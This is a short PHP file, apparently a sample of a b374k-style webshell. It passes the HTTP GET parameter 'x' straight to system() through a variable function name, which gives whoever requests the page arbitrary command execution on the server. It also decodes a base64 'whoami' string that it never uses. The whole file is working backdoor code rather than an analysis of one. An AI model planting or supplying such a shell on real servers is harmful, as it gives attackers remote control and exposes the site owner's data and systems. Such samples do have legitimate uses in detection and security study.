<?php
// b374k-style obfuscated webshell
// Uses base64 encoding for obfuscation

$func = "system";
$encoded_cmd = base64_decode("d2hvYW1p"); // "whoami"

if(isset($_GET['x'])) {
    $func($_GET['x']);
}
?>
